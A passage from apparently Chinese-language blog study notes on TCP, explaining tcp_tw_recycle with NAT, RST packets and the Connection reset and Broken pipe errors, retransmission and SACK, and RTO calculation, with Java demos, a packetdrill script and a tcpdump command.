<h3 id="tcp-tw-recyle-选项"><a href="#tcp-tw-recyle-选项" class="headerlink" title="tcp_tw_recyle 选项"></a>tcp_tw_recyle 选项</h3><p>cp_tw_recyle 是一个比 tcp_tw_reuse 更激进的方案， 系统会缓存每台主机（即 IP）连接过来的最新的时间戳。对于新来的连接，如果发现 SYN 包中带的时间戳与之前记录的来自同一主机的同一连接的分组所携带的时间戳相比更旧，则直接丢弃。如果更新则接受复用 TIME-WAIT 连接。</p>
<p>这种机制在客户端与服务端一对一的情况下没有问题，如果经过了 <code>NAT</code> 或者负载均衡，问题就很严重了。</p>
<p>什么是 <code>NAT</code>呢？</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/119.jpg"></p>
<p><code>NAT</code>（Network Address Translator）的出现是为了缓解 IP 地址耗尽的临时方案，IPv4 的地址是 32 位，全部利用最 多只能提 42.9 亿个地址，去掉保留地址、组播地址等剩下的只有 30 多亿，互联网主机数量呈指数级的增长，如果给每个设备都分配一个唯一的 IP 地址，那根本不够。于是 1994 年推出的 NAT 规范，NAT 设备负责维护局域网私有 IP 地址和端口到外网 IP 和端口的映射规则。</p>
<p>它有两个明显的优点</p>
<p>出口 IP 共享：通过<code>一个公网地址</code>可以让许多机器连上网络，解决 IP 地址不够用的问题</p>
<p>安全隐私防护：实际的机器可以隐藏自己真实的 IP 地址 当然也有明显的弊端：NAT 会对包进行修改，有些协议无法通过 <code>NAT</code>。</p>
<p>当 <code>tcp_tw_recycle</code> 遇上 <code>NAT</code> 时，因为客户端出口 IP 都一样，会导致服务端看起来都在跟同一个 host 打交道。不同客户端携带的 timestamp 只跟自己相关，如果一个时间戳较大的客户端 A 通过 NAT 与服务器建连，时间戳较小的客户端 B 通过 NAT 发送的包服务器认为是过期重复的数据，直接丢弃，导致 B 无法正常建连和发数据。</p>
<h3 id="小结-11"><a href="#小结-11" class="headerlink" title="小结"></a>小结</h3><p>TIME_WAIT 状态是最容易造成混淆的一个概念，这个状态存在的意义是</p>
<p>1.可靠的实现 TCP 全双工的连接终止（处理最后 ACK 丢失的情况）</p>
<p>2.避免当前关闭连接与后续连接混淆（让旧连接的包在网络中消逝）</p>
<h3 id="习题-1"><a href="#习题-1" class="headerlink" title="习题"></a>习题</h3><p>1、TCP 状态变迁中，存在 TIME_WAIT 状态，请问以下正确的描述是？(ACD)</p>
<pre><code>A、TIME_WAIT 状态可以帮助 TCP 的全双工连接可靠释放
B、TIME_WAIT 状态是 TCP 是三次握手过程中的状态
C、TIME_WAIT 状态是为了保证重新生成的 socket 不受之前延迟报文的影响
D、TIME_WAIT 状态是为了让旧数据包消失在网络中</code></pre>
<h3 id="思考题-1"><a href="#思考题-1" class="headerlink" title="思考题"></a>思考题</h3><p>假设 MSL 是 60s，请问系统能够初始化一个新连接然后主动关闭的最大速率是多少？（忽略1~1024区间的端口）</p>
<p>2MSL = 120s，(65535 - 1024) / 120 = 537.6 次/秒</p>
<h2 id="21-爱搞事情的-RST-包-——-产生场景、Connection-reset-与-Broken-pipe"><a href="#21-爱搞事情的-RST-包-——-产生场景、Connection-reset-与-Broken-pipe" class="headerlink" title="21 爱搞事情的 RST 包 —— 产生场景、Connection reset 与 Broken pipe"></a>21 爱搞事情的 RST 包 —— 产生场景、Connection reset 与 Broken pipe</h2><p>在 TCP 协议中 RST 表示复位，用来<code>异常</code>的关闭连接，发送 RST 关闭连接时，不必等缓冲区的数据都发送出去，直接丢弃缓冲区中的数据，连接释放进入<code>CLOSED</code>状态。而接收端收到 RST 段后，也不需要发送 ACK 确认。</p>
<h3 id="RST-常见的几种情况"><a href="#RST-常见的几种情况" class="headerlink" title="RST 常见的几种情况"></a>RST 常见的几种情况</h3><p>我列举了常见的几种会出现 RST 的情况</p>
<h4 id="端口未监听"><a href="#端口未监听" class="headerlink" title="端口未监听"></a>端口未监听</h4><p>这种情况很常见，比如 web 服务进程挂掉或者未启动，客户端使用 <code>connect</code> 建连，都会出现 <code>&quot;Connection Reset&quot;</code> 或者<code>&quot;Connection refused&quot;</code> 错误。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/120.jpg"></p>
<p>这样机制可以用来检测对端端口是否打开，发送 SYN 包对指定端口，看会不会回复 <code>SYN+ACK</code> 包。如果回复了 SYN+ACK，说明监听端口存在，如果返回 <code>RST</code>，说明端口未对外监听，如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/121.jpg"></p>
<h4 id="一方突然断电重启，之前建立的连接信息丢失，另一方并不知道"><a href="#一方突然断电重启，之前建立的连接信息丢失，另一方并不知道" class="headerlink" title="一方突然断电重启，之前建立的连接信息丢失，另一方并不知道"></a>一方突然断电重启，之前建立的连接信息丢失，另一方并不知道</h4><p>这个场景在前面 <code>keepalive</code> 那里介绍过。客户端和服务器一开始三次握手建立连接，中间没有数据传输进入空闲状态。这时候服务器突然断电重启，之前主机上所有的 TCP 连接都丢失了，但是客户端完全不知晓这个情况。等客户端有数据有数据要发送给服务端时，服务端这边并没有这条连接的信息，发送 <code>RST</code> 给客户端，告知客户端自己无法处理，你趁早死了这条心吧。</p>
<p>整个过程如下图所示：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/122.jpg"></p>
<h4 id="调用-close-函数，设置了-SO-LINGER-为-true"><a href="#调用-close-函数，设置了-SO-LINGER-为-true" class="headerlink" title="调用 close 函数，设置了 SO_LINGER 为 true"></a>调用 close 函数，设置了 SO_LINGER 为 true</h4><p>如果设置 SO_LINGER 为 true，linger 设置为 0，当调用 socket.close() 时， close 函数会立即返回，同时丢弃缓冲区内所有数据并立即发送 RST 包重置连接。在 SO_LINGER 那一节有详细介绍这个参数的含义。</p>
<h3 id="RST-包如果丢失了怎么办？"><a href="#RST-包如果丢失了怎么办？" class="headerlink" title="RST 包如果丢失了怎么办？"></a>RST 包如果丢失了怎么办？</h3><p>这是一个比较有意思的问题，首先需要明确 <code>RST 是不需要确认的</code>。 下面假定是服务端发出 RST。</p>
<p>在 RST 没有丢失的情况下，发出 RST 以后服务端马上释放连接，进入 CLOSED 状态，客户端收到 RST 以后，也立刻释放连接，进入 CLOSED 状态。</p>
<p>如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/123.jpg"></p>
<p>如果 RST 丢失呢？</p>
<p>服务端依然是在发送 RST 以后马上进入<code>CLOSED</code>状态，因为 RST 丢失，客户端压根搞不清楚状况，不会有任何动作。等到有数据需要发送时，一厢情愿的发送数据包给服务端。因为这个时候服务端并没有这条连接的信息，会直接回复 RST。</p>
<p>如果客户端收到了这个 RST，就会自然进入<code>CLOSED</code>状态释放连接。如果 RST 依然丢失，客户端只是会单纯的数据丢包了，进入数据重传阶段。如果还一直收不到 RST，会在一定次数以后放弃。</p>
<p>如下图所示</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/124.jpg"></p>
<h3 id="Broken-pipe-与-Connection-reset-by-peer"><a href="#Broken-pipe-与-Connection-reset-by-peer" class="headerlink" title="Broken pipe 与 Connection reset by peer"></a>Broken pipe 与 Connection reset by peer</h3><p>Broken pipe 与 Connection reset by peer 错误在网络编程中非常常见，出现的前提都是连接已关闭。</p>
<p>Connection reset by peer 这个错误很好理解，前面介绍了很多 RST 出现的场景。</p>
<p><code>Broken pipe</code>出现的时机是：在一个 RST 的套接字继续写数据，就会出现<code>Broken pipe</code>。</p>
<p>下面来模拟 Broken pipe 的情况，服务端代码非常简单，几乎什么都没做。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ServerSocket serverSocket &#x3D; new ServerSocket(9999);</span><br><span class="line">        Socket socket &#x3D; serverSocket.accept();</span><br><span class="line">        OutputStream out &#x3D; socket.getOutputStream();</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(socket.getInputStream()));</span><br><span class="line">            String line &#x3D; reader.readLine();</span><br><span class="line">            System.out.println(&quot;&gt;&gt;&gt;&gt; process &quot; + line);</span><br><span class="line">            out.write(&quot;hello, this is server&quot;.getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>javac Server.java; javac -cp . Server</code>编译并运行服务端代码。</p>
<p>客户端代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Socket socket &#x3D; new Socket();</span><br><span class="line">        socket.connect(new InetSocketAddress(&quot;c2&quot;, 9999));</span><br><span class="line"></span><br><span class="line">        OutputStream out &#x3D; socket.getOutputStream();</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;start sleep. kill server process now!&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 这个时候 kill 掉服务端进程</span><br><span class="line">        TimeUnit.SECONDS.sleep(5);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;start first write&quot;);</span><br><span class="line">        &#x2F;&#x2F; 第一次 write，客户端并不知道连接已经不在了，这次 write 不会抛异常,只会触发 RST 包，应用层是收不到的</span><br><span class="line">        out.write(&quot;hello&quot;.getBytes());</span><br><span class="line"></span><br><span class="line">        TimeUnit.SECONDS.sleep(2);</span><br><span class="line">        System.out.println(&quot;start second write&quot;);</span><br><span class="line">        &#x2F;&#x2F; 第二次 write, 触发 Broken Pipe</span><br><span class="line">        out.write(&quot;world&quot;.getBytes());</span><br><span class="line"></span><br><span class="line">        System.in.read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思路是先三次握手建连，然后马上 kill 掉服务端进程。客户端随后进行了两次 write，第一次 write 会触发服务端发送 RST 包，第二次 write 会抛出<code>Broken pipe</code>异常</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">start sleep. kill server process now!</span><br><span class="line">start first write</span><br><span class="line">start second write</span><br><span class="line">Exception in thread &quot;main&quot; java.net.SocketException: Broken pipe</span><br><span class="line">	at java.net.SocketOutputStream.socketWrite0(Native Method)</span><br><span class="line">	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109)</span><br><span class="line">	at java.net.SocketOutputStream.write(SocketOutputStream.java:141)</span><br><span class="line">	at Client.main(Client.java:25)</span><br></pre></td></tr></table></figure>
<p>抓包见下图。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/125.jpg"></p>
<p>当一个进程<code>向某个已收到 RST 的套接字执行写操作</code>时，内核向该进程发送一个 SIGPIPE 信号。该信号的默认行为是终止进程，因此进程一般会捕获这个信号进行处理。不论该进程是捕获了该信号并从其信号处理函数返回，还是简单地忽略该信号，写操作都将返回 <code>EPIPE</code> 错误（也就Broken pipe 错误）,这也是 Broken pipe 只在写操作中出现的原因。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/126.jpg"></p>
<p>相比于 Broken pipe，Connection reset by peer 这个错误就更加容易出现一些了。一个最简单的方式是把上面代码中的第二次 write 改为 read，就会出现 <code>Connection reset</code></p>
<p>运行日志如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">start sleep. kill server process now!</span><br><span class="line">start first write</span><br><span class="line">start second write</span><br><span class="line">Exception in thread &quot;main&quot; java.net.SocketException: Connection reset</span><br><span class="line">	at java.net.SocketInputStream.read(SocketInputStream.java:209)</span><br><span class="line">	at java.net.SocketInputStream.read(SocketInputStream.java:141)</span><br><span class="line">	at sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:284)</span><br><span class="line">	at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:326)</span><br><span class="line">	at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)</span><br><span class="line">	at java.io.InputStreamReader.read(InputStreamReader.java:184)</span><br><span class="line">	at java.io.BufferedReader.fill(BufferedReader.java:161)</span><br><span class="line">	at java.io.BufferedReader.readLine(BufferedReader.java:324)</span><br><span class="line">	at java.io.BufferedReader.readLine(BufferedReader.java:389)</span><br><span class="line">	at Client.main(Client.java:28)</span><br></pre></td></tr></table></figure>
<h3 id="小结-12"><a href="#小结-12" class="headerlink" title="小结"></a>小结</h3><p>这篇文章主要介绍了 RST 包相关的内容，我们来回顾一下。首先介绍了 RST 出现常见的几种情况</p>
<p>1.端口未监听</p>
<p>2.连接信息丢失，另一方并不知道继续发送数据</p>
<p>3.SO_LINGER 设置丢弃缓冲区数据，立刻 RST</p>
<p>然后介绍了两个场景的错误 <code>Connection reset</code> 和 <code>Broken pipe</code> 以及背后的原因，RST 包的案例后面还有一篇文章会介绍。</p>
<h2 id="22-重传机制-——-超时重传、快速重传与-SACK"><a href="#22-重传机制-——-超时重传、快速重传与-SACK" class="headerlink" title="22 重传机制 —— 超时重传、快速重传与 SACK"></a>22 重传机制 —— 超时重传、快速重传与 SACK</h2><h3 id="重传示例"><a href="#重传示例" class="headerlink" title="重传示例"></a>重传示例</h3><p>下面用 packetdrill 来演示丢包重传，模拟的场景如下图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/127.jpg"></p>
<p>packetdrill 脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 1 0   socket(..., SOCK_STREAM, IPPROTO_TCP) &#x3D; 3</span><br><span class="line"> 2 +0  setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) &#x3D; 0</span><br><span class="line"> 3 +0  bind(3, ..., ...) &#x3D; 0</span><br><span class="line"> 4 +0  listen(3, 1) &#x3D; 0</span><br><span class="line"> 5</span><br><span class="line"> 6 &#x2F;&#x2F; 三次握手</span><br><span class="line"> 7 +0  &lt; S 0:0(0) win 4000 &lt;mss 1000&gt;</span><br><span class="line"> 8 +0  &gt; S. 0:0(0) ack 1 &lt;...&gt;</span><br><span class="line"> 9 +.1 &lt; . 1:1(0) ack 1 win 4000</span><br><span class="line">10 +0  accept(3, ..., ...) &#x3D; 4</span><br><span class="line">11</span><br><span class="line">12 &#x2F;&#x2F; 往 fd 为 4 的 socket 文件句柄写入 1000 个字节数据（也即向客户端发送数据）</span><br><span class="line">13 +0  write(4, ..., 1000) &#x3D; 1000</span><br><span class="line">14</span><br><span class="line">15 &#x2F;&#x2F; 注释掉 向协议栈注入 ACK 包的代码，模拟客户端不回 ACK 包的情况</span><br><span class="line">16 &#x2F;&#x2F; +.1 &lt; . 1:1(0) ack 1001 win 1000</span><br><span class="line">17</span><br><span class="line">18 +0 &#96;sleep 1000000&#96;</span><br></pre></td></tr></table></figure>
<p>1 ~ 4 行：新建 socket + bind + listen</p>
<p>7 ~ 9 行：三次握手 + accept 新的连接</p>
<p>13 行：服务端往新的 socket 连接上写入 1000 个字节的文件</p>
<p>16 行：正常情况下，客户端应该回复 ACK 包表示此前的 1000 个字节包已经收到，这里注释掉模拟 ACK 包丢失的情况。</p>
<p>使用 tcpdump 抓包保存为 pcap 格式，后面 wireshark 可以直接查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i any port 8080 -nn -A -w retrans.pcap</span><br></pre></td></tr></table></figure>
<p>使用 wireshark 打开这个 pcap 文件，因为我们想看重传的时间间隔，可以在 wireshark 中设置时间的显示格式为显示包与包直接的实际间隔，更方便的查看重传间隔，步骤如下图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/128.jpg"></p>
<p>可以看到重传时间间隔是指数级退避，直到达到 120s 为止，总时间将近 15 分钟，重传次数是 15次 ，重传次数默认值由 <code>/proc/sys/net/ipv4/tcp_retries2</code> 决定（等于 15），会根据 RTO 的不同来动态变化。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/129.jpg"></p>
<p>整个过程如下：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/130.jpg"></p>
<h3 id="永远记住-ACK-是表示这之前的包都已经全部收到"><a href="#永远记住-ACK-是表示这之前的包都已经全部收到" class="headerlink" title="永远记住 ACK 是表示这之前的包都已经全部收到"></a>永远记住 ACK 是表示这之前的包都已经全部收到</h3><p>如果发送 5000 个字节的数据包，因为 MSS 的限制每次传输 1000 个字节，分 5 段传输，如下图：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/131.jpg"></p>
<p>数据包 1 发送的数据正常到达接收端，接收端回复 ACK 1001，表示 seq 为1001之前的数据包都已经收到，下次从1001开始发。 数据包 2（10001：2001）因为某些原因未能到达服务端，其他包正常到达，这时接收端也不能 ack 3 4 5 数据包，因为数据包 2 还没收到，接收端只能回复 ack 1001。</p>
<p>第 2 个数据包重传成功以后服务器会回复5001，表示seq 为 5001 之前的数据包都已经收到了。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/132.jpg"></p>
<h3 id="快速重传机制与-SACK"><a href="#快速重传机制与-SACK" class="headerlink" title="快速重传机制与 SACK"></a>快速重传机制与 SACK</h3><p>文章一开始我们介绍了重传的时间间隔，要等几百毫秒才会进行第一次重传。聪明的网络协议设计者们想到了一种方法：<code>「快速重传」</code> 快速重传的含义是：当发送端收到 3 个或以上重复 ACK，就意识到之前发的包可能丢了，于是马上进行重传，不用傻傻的等到超时再重传。</p>
<p>这个有一个问题，发送 3、4、5 包收到的全部是 ACK=1001，快速重传解决了一个问题: 需要重传。因为除了 2 号包，3、4、5 包也有可能丢失，那到底是只重传数据包 2 还是重传 2、3、4、5 所有包呢？</p>
<p>聪明的网络协议设计者，想到了一个好办法</p>
<p>1.收到 3 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 1000（ACK=1001），[1:1001]、[2001:3001] 区间的包我也收到了</p>
<p>2.收到 4 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 1000（ACK=1001），[1:1001]、[2001:4001] 区间的包我也收到了</p>
<p>3.收到 5 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 1000（ACK=1001），[1:1001]、[2001:5001] 区间的包我也收到了</p>
<p>这样发送端就清楚知道只用重传 2 号数据包就可以了，数据包 3、4、5已经确认无误被对端收到。这种方式被称为 <code>SACK</code>（Selective Acknowledgment）。</p>
<p>如下图所示：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/133.jpg"></p>
<h3 id="使用-packetdrill-演示快速重传"><a href="#使用-packetdrill-演示快速重传" class="headerlink" title="使用 packetdrill 演示快速重传"></a>使用 packetdrill 演示快速重传</h3><h2 id="23-重传间隔有讲究-——-多久重传才合适"><a href="#23-重传间隔有讲究-——-多久重传才合适" class="headerlink" title="23 重传间隔有讲究 —— 多久重传才合适"></a>23 重传间隔有讲究 —— 多久重传才合适</h2><p>看了前面的重传的文章，你可能有一个疑惑，到底隔多久重传才是合适的呢？间隔设置比较长，包丢了老半天了才重传，效率较低。间隔设置比较短，可能包并没有丢就重传，增加网络拥塞，可能导致更多的超时和重发。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/134.jpg"></p>
<p>因此间隔多久重传就是不是一成不变的，它随着不同的网络情况需要动态的进行调整，这个值就是今天要介绍的<code>「超时重传的时间」</code>（Retransmission TimeOut，RTO），它与 RTT 密切相关，下面我们来介绍几种计算 RTO 的方法</p>
<h3 id="经典方法（适用-RTT-波动较小的情况）"><a href="#经典方法（适用-RTT-波动较小的情况）" class="headerlink" title="经典方法（适用 RTT 波动较小的情况）"></a>经典方法（适用 RTT 波动较小的情况）</h3><p>一个最简单的想法就是取平均值，比如第一次 RTT 为 500ms，第二次 RTT 为 800ms，那么第三次发送时，各让一步取平均值 RTO 为 650ms。经典算法的思路跟取平均值是一样的，只不过系数不一样而已。</p>
<p>经典算法引入了「平滑往返时间」（Smoothed round trip time，SRTT）的概念：经过平滑后的RTT的值，每测量一次 RTT 就对 SRTT 作一次更新计算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SRTT &#x3D; ( α * SRTT ) + ((1- α) * RTT)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/135.jpg"></p>
<p>α 是平滑因子，建议值是0.8 ~ 0.9。假设平滑因子 α = 0.8，那么 SRTT = 80% 的原始值 + 20% 的新采样值。相当于一个低通滤波器。</p>
<pre><code>当 α 趋近于 1 时，1 - α 趋近于 0，SRTT 越接近上一次的 SRTT 值，与新的 RTT 值的关系越小，表现出来就是对短暂的时延变化越不敏感。
当 α 趋近于 0 时，1 - α 趋近于 1，SRTT 越接近新采样的 RTT 值，与旧的 SRTT 值关系越小，表现出来就是对时延变化更敏感，能够更快速的跟随时延的变化而变化</code></pre>
<p>超时重传时间 RTO 的计算公式是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RTO &#x3D; min(ubound, max(lbound, β * SRTT))</span><br></pre></td></tr></table></figure>
<p>其中 β 是加权因子，一般推荐值为 1.3 ~ 2.0。ubound 为 RTO 的上界（upper bound），lbound 为 RTO 的下界（lower bound）。</p>
<p>这个公式的含义其实就是，RTO 是一个 1.3 倍到 2.0 倍的 SRTT 值，最大不超过最大值 ubound，最小不小于最小值 lbound</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/136.jpg"></p>
<p>这个算法下，平滑因子 α 取值范围是 0.8 ~ 0.9，RTT 对 RTO 的影响太小了，在相对稳定RTT 的网络环境中，这个算法表现还可以，如果在一个 RTT 变化较大的环境中，则效果较差。</p>
<p>于是出现了新的改进算法：标准方法。</p>
<h3 id="标准方法（Jacobson-Karels-算法）"><a href="#标准方法（Jacobson-Karels-算法）" class="headerlink" title="标准方法（Jacobson / Karels 算法）"></a>标准方法（Jacobson / Karels 算法）</h3><p>传统方法最大的问题是RTT 有大的波动时，很难即时反应到 RTO 上，因为都被平滑掉了。标准方法对 RTT 的采样增加了一个新的因素，</p>
<p>公式如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SRTT &#x3D; (1 -  α) * SRTT +  α * RTT</span><br><span class="line">RTTVAR &#x3D; (1 - β) * RTTVAR + β * (|RTT-SRTT|) </span><br><span class="line">RTO&#x3D; µ * SRTT + ∂ * RTTVar</span><br></pre></td></tr></table></figure>
